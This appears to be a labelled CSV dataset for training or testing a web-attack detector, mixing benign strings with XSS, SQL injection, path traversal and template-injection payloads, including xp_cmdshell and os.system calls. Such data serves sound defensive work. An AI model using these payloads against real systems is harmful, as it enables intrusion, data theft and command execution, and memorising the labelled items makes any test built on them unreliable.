"payload","label"
"<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>","XSS"
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""xyjg""  =  ""xyjg","SQLi"
"1%'   )    )     )   union all select null,null,null,null,null#","SQLi"
"1"" )  where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #","SQLi"
"1'  )  )   )  and 4069 = 8786 and   (  (   ( 'eftr' = 'eftr","SQLi"
"s5bal850de","Normal"
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>","XSS"
"..../%c0%af..../%c0%af..../%c0%af..../%c0%af..../%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"1'|| ( select 'glec' from dual where 4846 = 4846","SQLi"
"..../%c1%8s..../%c1%8s..../%c1%8s..../%c1%8s..../%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
"1' )  as gxpb where 7107 = 7107 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --","SQLi"
"select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1","SQLi"
"<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>","XSS"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""ulfr"" like ""ulfr","SQLi"
"<del onpointerout=alert(1)>XSS</del>","XSS"
"-9355' or  ( 8459 = 8459 ) *4906 and 'aegf' = 'aegf","SQLi"
"%2e%2e%c0%2fetc%c0%2fissue","Suspicious"
"bar7ech7r5","Normal"
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>","XSS"
"92624028s","Normal"
"<svg><bdo onload=alert(1)></bdo>","XSS"
"Warplanes attack store Russian missiles port city Latakia , official says","Normal"
"</span> <span class=""toctext"">Machine ethics","Normal"
"%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue","Suspicious"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi","SQLi"
"SELECT TOP 3 * FROM report SELECT * FROM pleasure 3SELECT * FROM farm","Normal"
"select * from generate_series ( 6730,6730,case when  ( 6730 = 9431 )  then 1 else 0 end )  limit 1--","SQLi"
"...\...\...\...\...\...\windows\system32\drivers\etc\hosts","Suspicious"
"'; exec master..xp_cmdshell","SQLi"
"%2e.%c0%qf%2e.%c0%qf%2e.%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"%%c0%6e%c0%6e%bg%qf%%c0%6e%c0%6e%bg%qfboot.ini","Suspicious"
"SELECT AVG ( for ) FROM ordinary","Normal"
"%2e.\%2e.\%2e.\%2e.\etc\issue","Suspicious"
"<object onkeypress=""alert(1)"" contenteditable>test</object>","XSS"
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn","SQLi"
"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}","Suspicious"
"?.\?.\?.\?.\?.\?.\etc\issue","Suspicious"
"SELECT * FROM completely WHERE bean = 'harder' LIMIT 3","Normal"
"2036710936767005","Normal"
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi","SQLi"
".%2e%c0%2f.%2e%c0%2fetc%c0%2fissue","Suspicious"
"1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'mqoj' like 'mqoj","SQLi"
"1"" )  where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts","Suspicious"
"plaa verdum 144,","Normal"
"jia","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae0x5cetc0x5cpasswd","Suspicious"
"SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting'","Normal"
"%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25afetc%25c0%25afissue","Suspicious"
"An overview milk egg alternatives Vegan nutrition promotes vegetable alternatives eggs , milk dairy products","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%bg%qfetc%bg%qfissue","Suspicious"
"-6566'  )   as kggb where 9768  =  9768 order by 1--","SQLi"
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>","XSS"
"avinguda castellot, 116,","Normal"
"crcova valentini","Normal"
"%%c0%6e%c0%6e%%35%%63etc%%35%%63passwd","Suspicious"
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe","SQLi"
"%5C..%e0%80%afetc%e0%80%afissue","Suspicious"
"1""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""rurz"" = ""rurz","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>","XSS"
".?%c0%9v.?%c0%9v.?%c0%9v.?%c0%9v.?%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts","Suspicious"
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj","SQLi"
"%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%afboot.ini","Suspicious"
"%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd","Suspicious"
"%2e%2e%u2216%2e%2e%u2216boot.ini","Suspicious"
"<li><a href=""/wiki/Evolutionary_robotics"" title=""Evolutionary robotics"">Evolutionary robotics </a> </li>","Normal"
"<center draggable=""true"" ondrag=""alert(1)"">test</center>","XSS"
"SELECT * FROM  ( SELECT either FROM willing )","Normal"
"%c0%fe%c0%fe%c1%8s%c0%fe%c0%fe%c1%8setc%c1%8sissue","Suspicious"
"or userid like '%","SQLi"
"..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"c/ salvador 64, 5c","Normal"
"tabakov@wdsl.ly","Normal"
"<nobr onmouseout=""alert(1)"">test</nobr>","XSS"
"%252e%252e%bg%qf%252e%252e%bg%qf%252e%252e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"lilias","Normal"
".%2e%c1%9c.%2e%c1%9c.%2e%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"SELECT * FROM watch FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM remember","Normal"
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>","XSS"
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>","XSS"
"c/ don bosco 65, 10-d","Normal"
"1""   )    )     )   union all select null,null#","SQLi"
"kosanovic@discon.cg","Normal"
"<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>","XSS"
"So , non-story ,","Normal"
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa","SQLi"
"SELECT COUNT ( occur )  FROM trap","Normal"
"SELECT zero ( s )  FROM rabbit SELECT travel FROM industry","Normal"
"%2e%2e%c0%5c%2e%2e%c0%5c%2e%2e%c0%5c%2e%2e%c0%5c%2e%2e%c0%5c%2e%2e%c0%5cetc%c0%5cpasswd","Suspicious"
"santa agueda 54, 1?c","Normal"
"%2e.%e0%80%af%2e.%e0%80%afboot.ini","Suspicious"
"<table id=x tabindex=1 onbeforeactivate=alert(1)></table>","XSS"
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#","SQLi"
"1'  )  )   )  and 2542 = 7042--","SQLi"
"26774865j","Normal"
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>","XSS"
"1'  )   where 5540  =  5540 waitfor delay '0:0:5'--","SQLi"
"<li id=""cite_note-Evans_2015-407""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Evans_2015_407-0"">^ </a> </b>","Normal"
"end and    (    (   2160  =  2160","SQLi"
"1' union all select null,null,null,null,null,null,null,null,null,null--","SQLi"
"9304951385291211","Normal"
"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #","SQLi"
"1"" union all select null,null,null,null,null,null,null#","SQLi"
"chimillas","Normal"
"<ul><li><a href=""/wiki/Software_development_process"" title=""Software development process"">Software development process </a> </li>","Normal"
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe","SQLi"
"martin machio, 31","Normal"
"%c0%fe%c0%fe%c0%9v%c0%fe%c0%fe%c0%9v%c0%fe%c0%fe%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts","Suspicious"
"<address onclick=""alert(1)"">test</address>","XSS"
"michels","Normal"
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi","SQLi"
"I wish expiate, live","Normal"
"chirona","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8etc%uEFC8issue","Suspicious"
"rad0oelctrico","Normal"
"%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66boot.ini","Suspicious"
"-2071 union all select 4753,4753--","SQLi"
"68160355q","Normal"
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  ""","SQLi"
"1   )    )    union all select null,null,null,null--","SQLi"
"1' )  and  ( 3020 = 3020 ) *6703 and  ( 'botl' like 'botl","SQLi"
"1%' and 9127 = 7687--","SQLi"
"%2e%2e%c1%pc%2e%2e%c1%pcetc%c1%pcissue","Suspicious"
"<rt onmouseup=""alert(1)"">test</rt>","XSS"
"%c0%5e%c0%5e%bg%qf%c0%5e%c0%5e%bg%qf%c0%5e%c0%5e%bg%qfboot.ini","Suspicious"
"polesello@tantomontamontatanto.int","Normal"
"%25c0%25ae%25c0%25ae%uF025%25c0%25ae%25c0%25ae%uF025%25c0%25ae%25c0%25ae%uF025etc%uF025issue","Suspicious"
"bruna","Normal"
"embaldosada","Normal"
"37329","Normal"
"%c0%ee%c0%ee%c1%pc%c0%ee%c0%ee%c1%pc%c0%ee%c0%ee%c1%pcboot.ini","Suspicious"
"1   )    )     )   union all select null--","SQLi"
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk"" = ""jkfk","SQLi"
"%5C..%uEFC8%5C..%uEFC8%5C..%uEFC8%5C..%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts","Suspicious"
"../../../../etc/passwd;index.html","Suspicious"
"SELECT COUNT ( DISTINCT worker )  FROM jar","Normal"
"vree@eddydaniele.tm","Normal"
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju","SQLi"
"%c0.%c0.%255c%c0.%c0.%255c%c0.%c0.%255c%c0.%c0.%255c%c0.%c0.%255cwindows%255csystem32%255cdrivers%255cetc%255chosts","Suspicious"
"%25c0%25ae%25c0%25ae0x5c%25c0%25ae%25c0%25ae0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"<menuitem onkeypress=""alert(1)"" contenteditable>test</menuitem>","XSS"
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>","XSS"
"<tt oncopy=""alert(1)"" contenteditable>test</tt>","XSS"
"<svg><element onload=alert(1)></element>","XSS"
"1 )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","SQLi"
"1%""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = ""","SQLi"
"%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8etc%uEFC8issue","Suspicious"
"Four cyclists managed break away top regional racers","Normal"
"1 )  where 7199 = 7199 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --","SQLi"
"9115","Normal"
"However , several planes could seen taking CNN","Normal"
"%f0%80%80%ae%f0%80%80%ae%255c%f0%80%80%ae%f0%80%80%ae%255c%f0%80%80%ae%f0%80%80%ae%255cetc%255cissue","Suspicious"
"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=59"" title=""Edit section: Malevolent and friendly AI"">edit </a><span class=""mw-editsection-bracket"">]","Normal"
"1'   )    )    as ypgz where 8704  =  8704","SQLi"
"1 and 9122 = 4153# nxcv","SQLi"
"<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>","XSS"
"1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'cbnc' like 'cbnc","SQLi"
"<main onpointerover=alert(1)>XSS</main>","XSS"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%pc%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%pcetc%c1%pcpasswd","Suspicious"
"%25c0%25ae%25c0%25ae%%32%%66%25c0%25ae%25c0%25ae%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts","Suspicious"
"1'+  (  select 'yjpp' where 8966  =  8966","SQLi"
"SELECT AVG ( rest ) FROM toy SELECT SUM ( be )","Normal"
"-8783'  )  )   union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--","SQLi"
"<div class=""after-portlet after-portlet-lang""><span class=""wb-langlinks-edit wb-langlinks-link""><a href=""https://www.wikidata.org/wiki/Special:EntityPage/Q11660#sitelinks-wikipedia"" title=""Edit interlanguage links"" class=""wbc-editpage"">Edit links </a>","Normal"
".../.0x5c.../.0x5c.../.0x5c.../.0x5c.../.0x5cetc0x5cissue","Suspicious"
"%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pcetc%c1%pcissue","Suspicious"
"<li id=""cite_note-AI_at_Stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Stanford_in_the_60s_161-0"">^ </a> </b>","Normal"
"%uff0e%uff0e%c1%1c%uff0e%uff0e%c1%1cetc%c1%1cissue","Suspicious"
"bakkum","Normal"
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>","XSS"
"??0x2f??0x2f??0x2f??0x2f??0x2fboot.ini","Suspicious"
"<var id=x tabindex=1 onfocus=alert(1)></var>","XSS"
"-5624' union all select 3723,3723,3723,3723,3723--","SQLi"
"-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --","SQLi"
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionend=alert(1)></dfn>","XSS"
"1%'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( '%' = '","SQLi"
"1  )  )   )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","SQLi"
"1' )  where 6731 = 6731 or elt ( 5873 = 5873,sleep ( 5  )  )  #","SQLi"
"1 )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )","SQLi"
"<header onpointerdown=alert(1)>XSS</header>","XSS"
"iif ( 3447 = 1084,1,1/0 )","SQLi"
"<dl onmouseleave=""alert(1)"">test</dl>","XSS"
".../.%uF025.../.%uF025.../.%uF025.../.%uF025.../.%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts","Suspicious"
"%f0%80%80%ae%f0%80%80%ae%c0%2f%f0%80%80%ae%f0%80%80%ae%c0%2f%f0%80%80%ae%f0%80%80%ae%c0%2f%f0%80%80%ae%f0%80%80%ae%c0%2f%f0%80%80%ae%f0%80%80%ae%c0%2fboot.ini","Suspicious"
"1""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""tvla"" = ""tvla","SQLi"
"SELECT * FROM actually WHERE    NOT history = 'thus'","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%c1%pcetc%c1%pcpasswd","Suspicious"
"..../0x2f..../0x2f..../0x2fetc0x2fpasswd","Suspicious"
"select case when 4488  =  5522 then 1 else null end--","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%bg%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%bg%qfetc%bg%qfissue","Suspicious"
"1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw","SQLi"
"jorey@20horas.ao","Normal"
"%2e%2e%c1%8setc%c1%8spasswd","Suspicious"
"Representatives German Federal Prosecutor &apos;s Office could either submit questions writing meet 30-year-old person Russia , reported Interfax Agency","Normal"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'tmdj' like 'tmdj","SQLi"
"1'  )  )   )  and 2006 = 2006","SQLi"
"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #","SQLi"
"??%2fetc%2fissue","Suspicious"
"-2733'  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'btjx' = 'btjx","SQLi"
"1, ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 7823 = 7823 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )","SQLi"
"-9950' or 4425  =  1975","SQLi"
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #","SQLi"
"select * from users where id = 1 or ""{."" or 1 = 1 -- 1","SQLi"
"02624260y","Normal"
"1 where 4448 = 4448 union all select null,null,null,null,null#","SQLi"
"<track draggable=""true"" ondragend=""alert(1)"">test</track>","XSS"
"SELECT AVG ( principal ) FROM house SELECT SUM ( feature )","Normal"
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss","SQLi"
"?.%25c0%25af?.%25c0%25af?.%25c0%25af?.%25c0%25af?.%25c0%25af?.%25c0%25afetc%25c0%25afissue","Suspicious"
"select * from users where id = 1 or ""%."" or 1 = 1 -- 1","SQLi"
".%00.%f8%80%80%80%af.%00.%f8%80%80%80%af.%00.%f8%80%80%80%af.%00.%f8%80%80%80%af.%00.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"1'||  (  select 'sliy' where 9494  =  9494","SQLi"
"%c0%5e%c0%5e\etc\issue","Suspicious"
"SELECT weather, which, runFROM cowboy WHERE idea  IS NOT NULL","Normal"
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>","XSS"
"8513667184992896","Normal"
"%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%af%c0%ee%c0%ee%e0%80%afboot.ini","Suspicious"
"..../%252f..../%252fetc%252fpasswd","Suspicious"
"<cite onmouseenter=""alert(1)"">test</cite>","XSS"
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'iifh'  =  'iifh","SQLi"
"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl","SQLi"
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>","XSS"
"corbo gornes","Normal"
"SELECT * FROM stiff ORDER BY dollar, steady","Normal"
"-9562' or 8571 = 8571--","SQLi"
"pl. obra sindical del hogar 43 5-a","Normal"
"With movement handling machines , shrill warning noise rings site","Normal"
"1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","SQLi"
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'oxvd' like 'oxvd","SQLi"
".?%c0%qf.?%c0%qf.?%c0%qfetc%c0%qfpasswd","Suspicious"
"1%""  )   union all select null,null,null,null,null--","SQLi"
"-6178  )  )   as lygb where 9559 = 9559 or  ( 8459 = 8459 ) *4906--","SQLi"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i","SQLi"
"1%""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""%"" = ""","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%2f%f8%80%80%80%ae%f8%80%80%80%ae%2fetc%2fissue","Suspicious"
"%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%af%c0%2e%c0%2e%e0%80%afetc%e0%80%afpasswd","Suspicious"
"%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63boot.ini","Suspicious"
"1""  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  ""uquh"" = ""uquh","SQLi"
"A better deal British business possible , increasingly necessary eurozone embarks road closer economic fiscal union","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%252f%f8%80%80%80%ae%f8%80%80%80%ae%252f%f8%80%80%80%ae%f8%80%80%80%ae%252f%f8%80%80%80%ae%f8%80%80%80%ae%252f%f8%80%80%80%ae%f8%80%80%80%ae%252f%f8%80%80%80%ae%f8%80%80%80%ae%252fboot.ini","Suspicious"
"76663718a","Normal"
"SELECT * FROM news WHERE gently NOT LIKE '[paper]%'","Normal"
"delete","SQLi"
"SELECT glad ( s )  FROM curious","Normal"
"SELECT * FROM perfect","Normal"
"huaripuma guisasola","Normal"
"1""   )    )    or sleep  (  5  )  #","SQLi"
".%00.%25c0%25af.%00.%25c0%25afboot.ini","Suspicious"
"%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts","Suspicious"
"select case when 8237  =  9948 then 1 else null end--","SQLi"
"SELECT separate, vote, likeFROM told WHERE camp  IS NOT NULL","Normal"
"..../%c0%2fetc%c0%2fpasswd","Suspicious"
"%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8%c0%5e%c0%5e%uEFC8boot.ini","Suspicious"
"1  )  )   )  union all select null--","SQLi"
"SELECT * FROM mighty","Normal"
".?\.?\.?\.?\boot.ini","Suspicious"
"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","Suspicious"
"37200229y","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9cetc%c1%9cpasswd","Suspicious"
"%5C..0x2f%5C..0x2f%5C..0x2f%5C..0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts","Suspicious"
